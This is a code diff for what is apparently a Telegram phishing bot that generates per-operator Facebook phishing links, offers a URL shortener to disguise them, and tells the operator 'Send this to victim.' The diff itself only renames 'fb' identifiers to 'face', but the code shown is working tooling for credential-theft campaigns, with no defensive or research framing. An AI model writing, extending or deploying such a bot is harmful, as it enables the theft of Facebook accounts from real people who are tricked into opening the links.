@@ -10,7 +10,7 @@ from bot.utils.storage import link_cache
 
 def generate_facebook_link(user_id):
     unique_id = str(uuid.uuid4())[:8]
-    link = f"{BASE_URL}/p/fb/{unique_id}?v={user_id}"
+    link = f"{BASE_URL}/p/face/{unique_id}?v={user_id}"
     link_cache[unique_id] = {
         "user_id": user_id,
         "time": time.time(),
@@ -29,9 +29,9 @@ def handle_face_button(bot, message, get_bottom_buttons):
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
         InlineKeyboardButton("🔗 Open Link", url=link),
-        InlineKeyboardButton("📋 Copy Link", callback_data="fb_copy"),
+        InlineKeyboardButton("📋 Copy Link", callback_data="face_copy"),
         InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
-        InlineKeyboardButton("⬅ Back", callback_data="fb_back")
+        InlineKeyboardButton("⬅ Back", callback_data="face_back")
     )
     
     bot.send_message(
@@ -49,23 +49,23 @@ def handle_face_callback(bot, call):
     user_id = call.message.chat.id
     data = call.data
     
-    if data == "fb_copy":
+    if data == "face_copy":
         bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")
         return
     
-    elif data == "fb_back":
+    elif data == "face_back":
         from bot.__init__ import start
         start(call.message)
         return
     
-    elif data == "fb_menu":
+    elif data == "face_menu":
         link = generate_facebook_link(user_id)
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
-            InlineKeyboardButton("📋 Copy Link", callback_data="fb_copy"),
+            InlineKeyboardButton("📋 Copy Link", callback_data="face_copy"),
             InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
-            InlineKeyboardButton("⬅ Back", callback_data="fb_back")
+            InlineKeyboardButton("⬅ Back", callback_data="face_back")
         )
         bot.edit_message_text(
             f"✅ *FACEBOOK phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
